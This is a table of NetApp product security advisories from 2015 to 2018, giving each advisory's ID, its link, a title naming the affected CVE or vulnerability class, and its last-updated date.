| [**NTAP-20180626-0001**](https://security.netapp.com/advisory/ntap-20180626-0001/) | March 2018 Network Time Protocol Daemon (ntpd) Vulnerabilities in NetApp Products | 2021-04-28 |
| [**NTAP-20180621-0001**](https://security.netapp.com/advisory/ntap-20180621-0001/) | CVE-2017-7568 Sensitive Information Disclosure vulnerability in OnCommand Unified Manager for 7-Mode (core package) | 2018-06-21 |
| [**NTAP-20180614-0002**](https://security.netapp.com/advisory/ntap-20180614-0002/) | CVE-2016-8747 Apache Tomcat Vulnerability in NetApp Products | 2018-06-14 |
| [**NTAP-20180614-0003**](https://security.netapp.com/advisory/ntap-20180614-0003/) | July 2017 Tomcat Vulnerabilities in NetApp Products | 2018-06-14 |
| [**NTAP-20180614-0001**](https://security.netapp.com/advisory/ntap-20180614-0001/) | March 2017 Apache Tomcat Vulnerabilities in NetApp Products | 2018-06-14 |
| [**NTAP-20180612-0001**](https://security.netapp.com/advisory/ntap-20180612-0001/) | CVE-2018-5488 Unauthenticated Remote Code Execution Vulnerability in SANtricity Products | 2018-06-12 |
| [**NTAP-20180607-0002**](https://security.netapp.com/advisory/ntap-20180607-0002/) | CVE-2016-8745 Apache Tomcat Vulnerability in NetApp Products | 2018-06-07 |
| [**NTAP-20180607-0003**](https://security.netapp.com/advisory/ntap-20180607-0003/) | May 2018 PHP Vulnerabilities in NetApp Products | 2019-03-08 |
| [**NTAP-20180607-0001**](https://security.netapp.com/advisory/ntap-20180607-0001/) | November 2016 Apache Tomcat Vulnerabilities in NetApp Products | 2018-09-07 |
| [**NTAP-20180605-0001**](https://security.netapp.com/advisory/ntap-20180605-0001/) | October 2016 Apache Tomcat Vulnerabilities in NetApp Products | 2018-06-05 |
| [**NTAP-20180601-0001**](https://security.netapp.com/advisory/ntap-20180601-0001/) | August 2016 Apache HTTP Server Vulnerabilities in NetApp Products | 2018-07-30 |
| [**NTAP-20180601-0005**](https://security.netapp.com/advisory/ntap-20180601-0005/) | CVE-2016-8612 Apache HTTP Server Vulnerability in NetApp Products | 2019-04-22 |
| [**NTAP-20180601-0003**](https://security.netapp.com/advisory/ntap-20180601-0003/) | CVE-2017-9798 Apache HTTP Server Vulnerability in NetApp Products | 2019-03-14 |
| [**NTAP-20180601-0002**](https://security.netapp.com/advisory/ntap-20180601-0002/) | June 2017 Apache HTTP Server Vulnerabilities in NetApp Products | 2019-03-14 |
| [**NTAP-20180601-0004**](https://security.netapp.com/advisory/ntap-20180601-0004/) | March 2018 Apache HTTP Server Vulnerabilities in NetApp Products | 2022-01-06 |
| [**NTAP-20180531-0001**](https://security.netapp.com/advisory/ntap-20180531-0001/) | February 2016 Apache Tomcat Vulnerabilities in NetApp Products | 2022-01-14 |
| [**NTAP-20180523-0002**](https://security.netapp.com/advisory/ntap-20180523-0002/) | CVE-2018-5485 Privilege Escalation Vulnerability in OnCommand Unified Manager for Windows 7.2 and above | 2018-05-23 |
| [**NTAP-20180523-0001**](https://security.netapp.com/advisory/ntap-20180523-0001/) | CVE-2018-5487 Unauthenticated Remote Code Execution Vulnerability in OnCommand Unified Manager for Linux and Windows 7.2 and above | 2018-11-30 |
| [**NTAP-20180521-0001**](https://security.netapp.com/advisory/ntap-20180521-0001/) | Speculative Execution Side Channel Vulnerabilities in NetApp Products | 2019-04-22 |
| [**NTAP-20180426-0001**](https://security.netapp.com/advisory/ntap-20180426-0001/) | October 2017 Perl Vulnerabilities in NetApp Products | 2019-06-12 |
| [**NTAP-20180425-0001**](https://security.netapp.com/advisory/ntap-20180425-0001/) | CVE-2018-5486 Java Debug Wire Protocol Local Code Execution Vulnerability in OnCommand Unified Manager for Linux 7.2 and above | 2018-05-23 |
| [**NTAP-20180423-0003**](https://security.netapp.com/advisory/ntap-20180423-0003/) | CVE-2016-10708 OpenSSH Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20180423-0004**](https://security.netapp.com/advisory/ntap-20180423-0004/) | CVE-2017-15906 OpenSSH Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20180423-0002**](https://security.netapp.com/advisory/ntap-20180423-0002/) | CVE-2018-5968 Jackson JSON Library Vulnerability in NetApp Products | 2020-12-08 |
| [**NTAP-20180423-0001**](https://security.netapp.com/advisory/ntap-20180423-0001/) | December 2016 Apache HTTP Server Vulnerabilities in Multiple NetApp Products | 2018-06-21 |
| [**NTAP-20180419-0001**](https://security.netapp.com/advisory/ntap-20180419-0001/) | April 2018 Java Platform Standard Edition Vulnerabilities in NetApp Products | 2021-01-05 |
| [**NTAP-20180419-0002**](https://security.netapp.com/advisory/ntap-20180419-0002/) | April 2018 MySQL Vulnerabilities in NetApp Products | 2019-03-08 |
| [**NTAP-20180330-0001**](https://security.netapp.com/advisory/ntap-20180330-0001/) | CVE-2018-1327 Apache Struts Vulnerability in NetApp Products | 2018-06-27 |
| [**NTAP-20180330-0002**](https://security.netapp.com/advisory/ntap-20180330-0002/) | March 2018 OpenSSL Vulnerabilities in NetApp Products | 2021-04-09 |
| [**NTAP-20180328-0001**](https://security.netapp.com/advisory/ntap-20180328-0001/) | CVE-2018-7489 Jackson JSON Library Vulnerability in NetApp Products | 2020-09-14 |
| [**NTAP-20180313-0001**](https://security.netapp.com/advisory/ntap-20180313-0001/) | March 2018 Samba Vulnerabilities in NetApp Products | 2018-03-13 |
| [**NTAP-20180306-0001**](https://security.netapp.com/advisory/ntap-20180306-0001/) | CVE-2017-15519 Unauthenticated Remote Access Vulnerability in SnapCenter | 2018-03-06 |
| [**NTAP-20180223-0001**](https://security.netapp.com/advisory/ntap-20180223-0001/) | CVE-2017-15518 Information Disclosure Vulnerability in OnCommand API Services and NetApp Service Level Manager | 2018-02-23 |
| [**NTAP-20180215-0001**](https://security.netapp.com/advisory/ntap-20180215-0001/) | CVE-2016-0793 Wildfly Vulnerability in NetApp Products | 2018-02-15 |
| [**NTAP-20180213-0001**](https://security.netapp.com/advisory/ntap-20180213-0001/) | SMBLoris Vulnerability in NetApp Products | 2018-08-31 |
| [**NTAP-20180201-0002**](https://security.netapp.com/advisory/ntap-20180201-0002/) | CVE-2015-6563 OpenSSH Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20180201-0001**](https://security.netapp.com/advisory/ntap-20180201-0001/) | CVE-2016-8858 OpenSSH Vulnerability in NetApp Products | 2021-04-15 |
| [**NTAP-20180201-0003**](https://security.netapp.com/advisory/ntap-20180201-0003/) | CVE-2017-17485 Jackson JSON Library vulnerability in NetApp Products | 2020-11-24 |
| [**NTAP-20180117-0003**](https://security.netapp.com/advisory/ntap-20180117-0003/) | CVE-2017-3145 ISC BIND Vulnerability in NetApp Products | 2018-09-07 |
| [**NTAP-20180117-0001**](https://security.netapp.com/advisory/ntap-20180117-0001/) | January 2018 Java Platform Standard Edition Vulnerabilities in NetApp Products | 2021-01-05 |
| [**NTAP-20180117-0002**](https://security.netapp.com/advisory/ntap-20180117-0002/) | January 2018 MySQL vulnerabilities in NetApp Products | 2019-03-08 |
| [**NTAP-20180112-0001**](https://security.netapp.com/advisory/ntap-20180112-0001/) | September 2017 PHP Vulnerabilities in NetApp Products | 2019-03-14 |
| [**NTAP-20180109-0001**](https://security.netapp.com/advisory/ntap-20180109-0001/) | CVE-2017-8779 rpcbind Vulnerability in NetApp Products | 2022-01-14 |
| [**NTAP-20180104-0001**](https://security.netapp.com/advisory/ntap-20180104-0001/) | Processor Speculated Execution Vulnerabilities in NetApp Products | 2020-06-12 |
| [**NTAP-20171222-0001**](https://security.netapp.com/advisory/ntap-20171222-0001/) | CVE-2017-13098 Bouncy Castle TLS Vulnerability in NetApp Products | 2018-07-30 |
| [**NTAP-20171215-0001**](https://security.netapp.com/advisory/ntap-20171215-0001/) | CVE-2017-14583 SMB Authentication Denial of Service (DoS) vulnerability in clustered Data ONTAP 9.x | 2017-12-15 |
| [**NTAP-20171214-0003**](https://security.netapp.com/advisory/ntap-20171214-0003/) | CVE-2017-15095 Jackson JSON Library vulnerability in NetApp Products | 2020-11-24 |
| [**NTAP-20171214-0001**](https://security.netapp.com/advisory/ntap-20171214-0001/) | CVE-2017-15707 Apache Struts Vulnerability in NetApp Products | 2018-06-27 |
| [**NTAP-20171214-0002**](https://security.netapp.com/advisory/ntap-20171214-0002/) | CVE-2017-7525 Jackson JSON Library Vulnerability in NetApp Products | 2020-11-24 |
| [**NTAP-20171208-0002**](https://security.netapp.com/advisory/ntap-20171208-0002/) | CVE-2016-6904 Plain Text Authentication vulnerability in VASA Provider for Clustered Data ONTAP | 2017-12-08 |
| [**NTAP-20171208-0001**](https://security.netapp.com/advisory/ntap-20171208-0001/) | December 2017 OpenSSL Vulnerabilities in NetApp Products | 2021-04-09 |
| [**NTAP-20171130-0003**](https://security.netapp.com/advisory/ntap-20171130-0003/) | CVE-2016-6515 OpenSSH Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20171130-0001**](https://security.netapp.com/advisory/ntap-20171130-0001/) | CVE-2016-8610 OpenSSL Vulnerability in NetApp Products | 2021-01-05 |
| [**NTAP-20171130-0002**](https://security.netapp.com/advisory/ntap-20171130-0002/) | January 2017 OpenSSH Vulnerabilities in NetApp Products | 2020-09-01 |
| [**NTAP-20171120-0001**](https://security.netapp.com/advisory/ntap-20171120-0001/) | Intel SA-00086 Management Engine Vulnerabilities in NetApp Products | 2017-11-20 |
| [**NTAP-20171116-0001**](https://security.netapp.com/advisory/ntap-20171116-0001/) | CVE-2017-15517 AltaVault OST Plug-in Sensitive Information Vulnerability | 2017-11-16 |
| [**NTAP-20171114-0001**](https://security.netapp.com/advisory/ntap-20171114-0001/) | CVE-2017-15516 Cross-Site Request Forgery Vulnerability in SnapCenter Server | 2017-11-14 |
| [**NTAP-20171107-0001**](https://security.netapp.com/advisory/ntap-20171107-0001/) | CVE-2017-11461 Clickjacking Vulnerability in OnCommand Unified Manager for 7-mode (core package) | 2017-11-07 |
| [**NTAP-20171107-0002**](https://security.netapp.com/advisory/ntap-20171107-0002/) | CVE-2017-3736 OpenSSL Vulnerability in NetApp Products | 2021-01-05 |
| [**NTAP-20171031-0001**](https://security.netapp.com/advisory/ntap-20171031-0001/) | January 2016 Network Time Protocol Daemon (ntpd) Vulnerabilities in NetApp Products | 2019-02-08 |
| [**NTAP-20171024-0001**](https://security.netapp.com/advisory/ntap-20171024-0001/) | CVE-2017-15361 Infineon RSA Library Vulnerability in NetApp Products | 2017-10-24 |
| [**NTAP-20171019-0001**](https://security.netapp.com/advisory/ntap-20171019-0001/) | October 2017 Java Platform Standard Edition Vulnerabilities in NetApp Products | 2021-01-05 |
| [**NTAP-20171019-0002**](https://security.netapp.com/advisory/ntap-20171019-0002/) | October 2017 MySQL Vulnerabilities in NetApp Products | 2019-03-14 |
| [**NTAP-20171018-0001**](https://security.netapp.com/advisory/ntap-20171018-0001/) | August 2017 Apache Tomcat Vulnerabilities in NetApp Products | 2018-07-30 |
| [**NTAP-20171018-0002**](https://security.netapp.com/advisory/ntap-20171018-0002/) | CVE-2017-12617 Apache Tomcat Vulnerability in NetApp Products | 2018-07-30 |
| [**NTAP-20171004-0002**](https://security.netapp.com/advisory/ntap-20171004-0002/) | April 2016 Network Time Protocol Daemon (ntpd) Vulnerabilities in Multiple NetApp Products | 2020-01-28 |
| [**NTAP-20171004-0001**](https://security.netapp.com/advisory/ntap-20171004-0001/) | October 2015 Network Time Protocol Daemon (ntpd) Vulnerabilities in Multiple NetApp Products | 2019-09-18 |
| [**NTAP-20170927-0001**](https://security.netapp.com/advisory/ntap-20170927-0001/) | CVE-2017-3735 OpenSSL Vulnerability in Multiple NetApp Products | 2021-01-05 |
| [**NTAP-20170921-0001**](https://security.netapp.com/advisory/ntap-20170921-0001/) | September 2017 Samba Vulnerabilities in NetApp StorageGRID Products | 2018-08-31 |
| [**NTAP-20170911-0001**](https://security.netapp.com/advisory/ntap-20170911-0001/) | CVE-2017-12611 Apache Struts Vulnerability in Multiple NetApp Products | 2018-01-19 |
| [**NTAP-20170911-0002**](https://security.netapp.com/advisory/ntap-20170911-0002/) | July 2017 Apache httpd Server Vulnerabilities in Multiple NetApp Products | 2019-03-14 |
| [**NTAP-20170907-0001**](https://security.netapp.com/advisory/ntap-20170907-0001/) | CVE-2017-9805 Apache Struts Vulnerability in Multiple NetApp Products | 2018-01-19 |
| [**NTAP-20170831-0003**](https://security.netapp.com/advisory/ntap-20170831-0003/) | CVE-2016-1895 Unsafe User Input String Vulnerability in Data ONTAP | 2017-08-31 |
| [**NTAP-20170831-0001**](https://security.netapp.com/advisory/ntap-20170831-0001/) | CVE-2017-14053 Session Cookie Vulnerability in OnCommand Unified Manager for Clustered Data ONTAP | 2017-08-31 |
| [**NTAP-20170831-0002**](https://security.netapp.com/advisory/ntap-20170831-0002/) | Unauthorized Read and Remote Code Execution Vulnerabilities in clustered Data ONTAP 8.3 | 2017-09-05 |
| [**NTAP-20170825-0001**](https://security.netapp.com/advisory/ntap-20170825-0001/) | CVE-2017-12422 Unauthorized Object Deletion Vulnerability in StorageGRID WebScale | 2017-08-25 |
| [**NTAP-20170815-0001**](https://security.netapp.com/advisory/ntap-20170815-0001/) | CVE-1999-0016 Denial of Service Vulnerability in Data ONTAP | 2017-08-15 |
| [**NTAP-20170815-0002**](https://security.netapp.com/advisory/ntap-20170815-0002/) | CVE-2017-12859 Denial of Service Vulnerability in Data ONTAP operating in 7-Mode | 2017-10-11 |
| [**NTAP-20170814-0001**](https://security.netapp.com/advisory/ntap-20170814-0001/) | CVE-2017-12420 Heap Overflow Vulnerability in clustered Data ONTAP | 2017-08-15 |
| [**NTAP-20170809-0001**](https://security.netapp.com/advisory/ntap-20170809-0001/) | CVE-2017-5201 Sensitive Information Disclosure Vulnerability in Clustered Data ONTAP | 2017-08-09 |
| [**NTAP-20170808-0001**](https://security.netapp.com/advisory/ntap-20170808-0001/) | Linux Memory Management Vulnerabilities in NetApp Products | 2019-05-31 |
| [**NTAP-20170803-0001**](https://security.netapp.com/advisory/ntap-20170803-0001/) | June 2017 sudo Vulnerabilities in NetApp Products | 2018-09-07 |
| [**NTAP-20170720-0001**](https://security.netapp.com/advisory/ntap-20170720-0001/) | July 2017 Java Platform Standard Edition Vulnerabilities in Multiple NetApp Products | 2021-01-05 |
| [**NTAP-20170720-0002**](https://security.netapp.com/advisory/ntap-20170720-0002/) | July 2017 MySQL Vulnerabilities in Multiple NetApp Products | 2018-08-25 |
| [**NTAP-20170718-0001**](https://security.netapp.com/advisory/ntap-20170718-0001/) | CVE-2017-8919 Information Disclosure Vulnerability in OnCommand API Services | 2017-07-18 |
| [**NTAP-20170630-0001**](https://security.netapp.com/advisory/ntap-20170630-0001/) | CVE-2017-7947 Information Disclosure Vulnerability in clustered Data ONTAP | 2017-07-14 |
| [**NTAP-20170526-0001**](https://security.netapp.com/advisory/ntap-20170526-0001/) | March 2017 Network Time Protocol Daemon (ntpd) Vulnerabilities in Multiple NetApp Products | 2018-12-11 |
| [**NTAP-20170524-0001**](https://security.netapp.com/advisory/ntap-20170524-0001/) | CVE-2017-7494 Samba Remote Code Execution Vulnerability in StorageGRID Products | 2018-08-31 |
| [**NTAP-20170517-0001**](https://security.netapp.com/advisory/ntap-20170517-0001/) | CVE-2017-7236: SQL Injection vulnerability in OnCommand Unified Manager Core Package (5.x) | 2017-05-17 |
| [**NTAP-20170517-0002**](https://security.netapp.com/advisory/ntap-20170517-0002/) | CVE-2017-7439: Information Disclosure vulnerability in OnCommand Unified Manager Core Package (5.x) | 2017-05-17 |
| [**NTAP-20170515-0001**](https://security.netapp.com/advisory/ntap-20170515-0001/) | NetApp Product Security Notice for WannaCrypt and Petya Ransomware | 2017-07-05 |
| [**NTAP-20170509-0001**](https://security.netapp.com/advisory/ntap-20170509-0001/) | CVE-2017-5689 Intel Management Engine Vulnerability in Multiple NetApp Products | 2017-05-10 |
| [**NTAP-20170420-0001**](https://security.netapp.com/advisory/ntap-20170420-0001/) | April 2017 Java Platform Standard Edition Vulnerabilities in Multiple NetApp Products | 2021-01-05 |
| [**NTAP-20170420-0002**](https://security.netapp.com/advisory/ntap-20170420-0002/) | April 2017 MySQL Vulnerabilities in Multiple NetApp Products | 2018-08-25 |
| [**NTAP-20170331-0001**](https://security.netapp.com/advisory/ntap-20170331-0001/) | CVE-2017-5988 Denial of Service Vulnerability in clustered Data ONTAP 8.1 and higher | 2017-05-25 |
| [**NTAP-20170331-0002**](https://security.netapp.com/advisory/ntap-20170331-0002/) | CVE-2017-7345 JMX RMI Information Disclosure Vulnerability in Multiple NetApp Products | 2017-03-31 |
| [**NTAP-20170323-0001**](https://security.netapp.com/advisory/ntap-20170323-0001/) | CVE-2016-5045 Cluster Peering Vulnerability in OnCommand System Manager 8.3.x | 2017-03-23 |
| [**NTAP-20170310-0001**](https://security.netapp.com/advisory/ntap-20170310-0001/) | CVE-2017-5638 Apache Struts Vulnerability in Multiple NetApp Products | 2017-03-10 |
| [**NTAP-20170310-0002**](https://security.netapp.com/advisory/ntap-20170310-0002/) | November 2016 Network Time Protocol Daemon (ntpd) Vulnerabilities in Multiple NetApp Products | 2018-12-11 |
| [**NTAP-20170228-0002**](https://security.netapp.com/advisory/ntap-20170228-0002/) | CVE-2016-5374 Missing SMB Authorization Check Vulnerability in ONTAP 9 | 2017-02-28 |
| [**NTAP-20170228-0001**](https://security.netapp.com/advisory/ntap-20170228-0001/) | CVE-2017-5995 ONTAP Select Deploy Sensitive Information Vulnerability | 2017-02-28 |
| [**NTAP-20170131-0001**](https://security.netapp.com/advisory/ntap-20170131-0001/) | CVE-2017-5600 Default Privileged Account Vulnerability in OnCommand Insight Data Warehouse | 2017-02-15 |
| [**NTAP-20170127-0001**](https://security.netapp.com/advisory/ntap-20170127-0001/) | January 2017 OpenSSL Vulnerabilities in Multiple NetApp Products | 2022-02-28 |
| [**NTAP-20170119-0001**](https://security.netapp.com/advisory/ntap-20170119-0001/) | January 2017 Java Platform Standard Edition Vulnerabilities in Multiple NetApp Products | 2019-02-07 |
| [**NTAP-20170119-0002**](https://security.netapp.com/advisory/ntap-20170119-0002/) | January 2017 MySQL Vulnerabilities in Multiple NetApp Products | 2018-08-25 |
| [**NTAP-20161220-0001**](https://security.netapp.com/advisory/ntap-20161220-0001/) | CVE-2016-7172 Sensitive Information Disclosure in Snap Creator Framework | 2016-12-20 |
| [**NTAP-20161219-0001**](https://security.netapp.com/advisory/ntap-20161219-0001/) | December 2016 Samba Vulnerabilities in Multiple NetApp Products | 2018-05-25 |
| [**NTAP-20161129-0001**](https://security.netapp.com/advisory/ntap-20161129-0001/) | CVE-2016-7171 Non-Unique Certificate Vulnerability in NetApp Plug-in for Symantec NetBackup | 2016-11-29 |
| [**NTAP-20161108-0001**](https://security.netapp.com/advisory/ntap-20161108-0001/) | CVE-2016-5711 Non-Unique Certificate Vulnerability in Virtual Storage Console | 2016-11-08 |
| [**NTAP-20161028-0001**](https://security.netapp.com/advisory/ntap-20161028-0001/) | CVE-2016-4341 SMB Share Information Disclosure Vulnerability in Clustered Data ONTAP | 2016-10-28 |
| [**NTAP-20161025-0001**](https://security.netapp.com/advisory/ntap-20161025-0001/) | CVE-2016-5195 Kernel Local Privilege Escalation Vulnerability in Multiple NetApp Products | 2019-05-31 |
| [**NTAP-20161019-0001**](https://security.netapp.com/advisory/ntap-20161019-0001/) | October 2016 Java Platform Standard Edition Vulnerabilities in Multiple NetApp Products | 2019-02-07 |
| [**NTAP-20161019-0002**](https://security.netapp.com/advisory/ntap-20161019-0002/) | October 2016 MySQL Vulnerabilities in Multiple NetApp Products | 2018-08-25 |
| [**NTAP-20161017-0001**](https://security.netapp.com/advisory/ntap-20161017-0001/) | CVE-2010-1871 JBoss Seam Vulnerability in Multiple NetApp Products | 2018-01-22 |
| [**NTAP-20161017-0002**](https://security.netapp.com/advisory/ntap-20161017-0002/) | CVE-2016-6667 Default Privileged Account Credentials Vulnerability in OnCommand Unified Manager for Clustered Data ONTAP | 2016-10-17 |
| [**NTAP-20160930-0001**](https://security.netapp.com/advisory/ntap-20160930-0001/) | CVE-2016-2776 ISC BIND Vulnerability in Multiple NetApp Products | 2018-12-11 |
| [**NTAP-20160929-0001**](https://security.netapp.com/advisory/ntap-20160929-0001/) | CVE-2016-6495 Information Disclosure Vulnerability in Data ONTAP operating in 7-Mode | 2016-09-29 |
| [**NTAP-20160928-0001**](https://security.netapp.com/advisory/ntap-20160928-0001/) | September 2016 OpenSSL Vulnerabilities in Multiple NetApp Products | 2019-07-24 |
| [**NTAP-20160915-0001**](https://security.netapp.com/advisory/ntap-20160915-0001/) | CVE-2016-2183 TLS Protocol 64-bit Cipher Vulnerability in Multiple NetApp Products | 2022-01-14 |
| [**NTAP-20160830-0002**](https://security.netapp.com/advisory/ntap-20160830-0002/) | CVE-2016-3064 Sensitive Information Disclosure Vulnerability in Clustered Data ONTAP | 2016-08-30 |
| [**NTAP-20160830-0001**](https://security.netapp.com/advisory/ntap-20160830-0001/) | CVE-2016-5047 Denial of Service Vulnerability in OnCommand System Manager 8.3.x | 2016-08-30 |
| [**NTAP-20160816-0001**](https://security.netapp.com/advisory/ntap-20160816-0001/) | CVE-2016-6820 Sensitive Information Disclosure in MetroCluster Tiebreaker for clustered Data ONTAP | 2016-08-16 |
| [**NTAP-20160802-0001**](https://security.netapp.com/advisory/ntap-20160802-0001/) | CVE-2015-8020 Default Privileged Account Credentials Vulnerability in in Clustered Data ONTAP | 2016-08-02 |
| [**NTAP-20160722-0002**](https://security.netapp.com/advisory/ntap-20160722-0002/) | CVE-2016-2775 ISC BIND Vulnerability in Multiple NetApp Products | 2017-03-08 |
| [**NTAP-20160722-0001**](https://security.netapp.com/advisory/ntap-20160722-0001/) | June 2016 Network Time Protocol Daemon (ntpd) Vulnerabilities in NetApp Products | 2018-01-22 |
| [**NTAP-20160721-0001**](https://security.netapp.com/advisory/ntap-20160721-0001/) | July 2016 Java Platform Standard Edition Vulnerabilities in Multiple NetApp Products | 2018-09-14 |
| [**NTAP-20160721-0002**](https://security.netapp.com/advisory/ntap-20160721-0002/) | July 2016 MySQL Vulnerabilities in Multiple NetApp Products | 2017-01-10 |
| [**NTAP-20160708-0001**](https://security.netapp.com/advisory/ntap-20160708-0001/) | CVE-2016-2119 Samba SMB Client Required Signing Downgrade Vulnerability | 2016-07-08 |
| [**NTAP-20160623-0001**](https://security.netapp.com/advisory/ntap-20160623-0001/) | CVE-2015-3253 Apache Groovy Vulnerability in OnCommand Insight | 2016-06-23 |
| [**NTAP-20160623-0004**](https://security.netapp.com/advisory/ntap-20160623-0004/) | Denial of Service Vulnerability in ATTO FibreBridge 7500N | 2016-07-03 |
| [**NTAP-20160623-0003**](https://security.netapp.com/advisory/ntap-20160623-0003/) | Multiple Elasticsearch Vulnerabilities in OnCommand Insight Anomaly Detection Engine | 2016-06-28 |
| [**NTAP-20160623-0002**](https://security.netapp.com/advisory/ntap-20160623-0002/) | Multiple Unauthenticated Remote Code Execution Vulnerabilities in OnCommand Insight | 2016-06-23 |
| [**NTAP-20160622-0001**](https://security.netapp.com/advisory/ntap-20160622-0001/) | CVE-2016-5372 Cross-Site Request Forgery Vulnerability in Snap Creator Framework | 2016-06-22 |
| [**NTAP-20160620-0001**](https://security.netapp.com/advisory/ntap-20160620-0001/) | CVE-2016-5710 Clickjacking Vulnerability in Snap Creator Framework | 2016-06-20 |
| [**NTAP-20160602-0001**](https://security.netapp.com/advisory/ntap-20160602-0001/) | OVA Build Inconsistencies Resulting in Vulnerability Regressions in Multiple NetApp Products | 2016-06-14 |
| [**NTAP-20160519-0001**](https://security.netapp.com/advisory/ntap-20160519-0001/) | May 2016 OpenSSH Vulnerabilities in Multiple NetApp Products | 2020-09-01 |
| [**NTAP-20160504-0001**](https://security.netapp.com/advisory/ntap-20160504-0001/) | May 2016 OpenSSL Vulnerabilities in Multiple NetApp Products | 2019-07-24 |
| [**NTAP-20160421-0001**](https://security.netapp.com/advisory/ntap-20160421-0001/) | April 2016 MySQL Vulnerabilities in Multiple NetApp Products | 2018-01-22 |
| [**NTAP-20160420-0001**](https://security.netapp.com/advisory/ntap-20160420-0001/) | April 2016 Java Platform Standard Edition Vulnerabilities in Multiple NetApp Products | 2018-09-14 |
| [**NTAP-20160412-0001**](https://security.netapp.com/advisory/ntap-20160412-0001/) | SMB Vulnerabilities in Multiple NetApp Products | 2019-12-20 |
| [**NTAP-20160330-0001**](https://security.netapp.com/advisory/ntap-20160330-0001/) | August 2015 OpenSSH Vulnerabilities in Multiple NetApp Products | 2018-01-22 |
| [**NTAP-20160328-0001**](https://security.netapp.com/advisory/ntap-20160328-0001/) | CVE-2016-0636 Java Platform Standard Edition Vulnerability in Multiple NetApp Products | 2018-07-30 |
| [**NTAP-20160324-0001**](https://security.netapp.com/advisory/ntap-20160324-0001/) | CVE-2015-3963 VxWorks Vulnerability impacting NetApp E-Series/EF-Series SANtricity OS Controller Firmware | 2016-04-26 |
| [**NTAP-20160322-0001**](https://security.netapp.com/advisory/ntap-20160322-0001/) | January 2016 ISC BIND Vulnerabilities in Multiple NetApp Products | 2018-08-22 |
| [**NTAP-20160322-0002**](https://security.netapp.com/advisory/ntap-20160322-0002/) | March 2016 ISC BIND Vulnerabilities in Multiple NetApp Products | 2018-11-02 |
| [**NTAP-20160321-0001**](https://security.netapp.com/advisory/ntap-20160321-0001/) | CVE-2016-2842 OpenSSL Vulnerability in Multiple NetApp Products | 2019-07-24 |
| [**NTAP-20160317-0001**](https://security.netapp.com/advisory/ntap-20160317-0001/) | December 2015 ISC BIND Vulnerabilities in Multiple NetApp Products | 2018-01-22 |
| [**NTAP-20160310-0003**](https://security.netapp.com/advisory/ntap-20160310-0003/) | CVE-2015-8322 Arbitrary Code Execution Vulnerability in OnCommand System Manager 8.3.x | 2016-08-11 |
| [**NTAP-20160310-0002**](https://security.netapp.com/advisory/ntap-20160310-0002/) | CVE-2016-1563 TLS Certificate Verification vulnerability in Clustered Data ONTAP | 2016-03-10 |
| [**NTAP-20160310-0001**](https://security.netapp.com/advisory/ntap-20160310-0001/) | CVE-2016-1894 Authentication Bypass Vulnerability in OnCommand Workflow Automation | 2016-03-11 |
| [**NTAP-20160310-0004**](https://security.netapp.com/advisory/ntap-20160310-0004/) | CVE-2016-3063 ZAPI Injection Vulnerability in OnCommand System Manager | 2016-08-11 |
| [**NTAP-20160303-0001**](https://security.netapp.com/advisory/ntap-20160303-0001/) | March 2016 OpenSSL Vulnerabilities in Multiple NetApp Products | 2019-07-24 |
| [**NTAP-20160301-0001**](https://security.netapp.com/advisory/ntap-20160301-0001/) | CVE-2016-0800 SSLv2 Vulnerability in Multiple NetApp Products | 2019-08-26 |
| [**NTAP-20160225-0001**](https://security.netapp.com/advisory/ntap-20160225-0001/) | CVE-2015-7575 TLS Vulnerability in Multiple NetApp Products | 2020-09-17 |
| [**NTAP-20160217-0002**](https://security.netapp.com/advisory/ntap-20160217-0002/) | CVE-2015-7547 GNU C Library (glibc) Vulnerability in Multiple NetApp Products | 2019-05-31 |
| [**NTAP-20160217-0001**](https://security.netapp.com/advisory/ntap-20160217-0001/) | CVE-2016-0603 Java Platform Standard Edition Vulnerability in Multiple NetApp Products | 2017-03-22 |
| [**NTAP-20160211-0001**](https://security.netapp.com/advisory/ntap-20160211-0001/) | CVE-2016-0728 Linux Kernel Privilege Escalation Vulnerability in NetApp Products | 2019-02-04 |
| [**NTAP-20160201-0001**](https://security.netapp.com/advisory/ntap-20160201-0001/) | January 2016 OpenSSL Vulnerabilities in Multiple NetApp Products | 2021-04-09 |
| [**NTAP-20160126-0001**](https://security.netapp.com/advisory/ntap-20160126-0001/) | January 2016 OpenSSH Vulnerabilities in Multiple NetApp Products | 2018-09-04 |
| [**NTAP-20160121-0001**](https://security.netapp.com/advisory/ntap-20160121-0001/) | January 2016 Java Platform Standard Edition Vulnerabilities in Multiple NetApp Products | 2018-09-07 |
| [**NTAP-20160121-0002**](https://security.netapp.com/advisory/ntap-20160121-0002/) | January 2016 MySQL Vulnerabilities in Multiple NetApp Products | 2017-01-10 |
| [**NTAP-20160114-0001**](https://security.netapp.com/advisory/ntap-20160114-0001/) | CVE-2015-5477 ISC BIND Vulnerability in Clustered Data ONTAP | 2016-01-14 |
| [**NTAP-20160114-0002**](https://security.netapp.com/advisory/ntap-20160114-0002/) | CVE-2015-7886 HTTPD Access Control Bypass Vulnerability in Data ONTAP operating in 7-Mode | 2016-01-14 |
| [**NTAP-20160111-0002**](https://security.netapp.com/advisory/ntap-20160111-0002/) | Authentication Bypass Vulnerability in SnapCenter Server 1.0 & 1.0P1 | 2016-01-11 |
| [**NTAP-20160111-0001**](https://security.netapp.com/advisory/ntap-20160111-0001/) | CVE-2015-8544 Sensitive Information Disclosure in SnapDrive for Windows | 2016-01-13 |
| [**NTAP-20151207-0001**](https://security.netapp.com/advisory/ntap-20151207-0001/) | December 2015 OpenSSL Vulnerabilities in Multiple NetApp Products | 2021-04-09 |
| [**NTAP-20151123-0001**](https://security.netapp.com/advisory/ntap-20151123-0001/) | Apache Commons Collection Java Deserialization Vulnerability in Multiple NetApp Products | 2024-03-05 |
| [**NTAP-20151112-0001**](https://security.netapp.com/advisory/ntap-20151112-0001/) | UTF-8 Volume Language Authentication Bypass Vulnerability in Data ONTAP operating in 7-Mode | 2021-01-05 |
| [**NTAP-20151106-0001**](https://security.netapp.com/advisory/ntap-20151106-0001/) | CVE-2015-5600 OpenSSH MaxAuthTries Bypass Vulnerability in NetApp Products | 2018-11-21 |
| [**NTAP-20151102-0001**](https://security.netapp.com/advisory/ntap-20151102-0001/) | Web Server Debugging Functions Vulnerability in OnCommand Workflow Automation | 2015-11-02 |
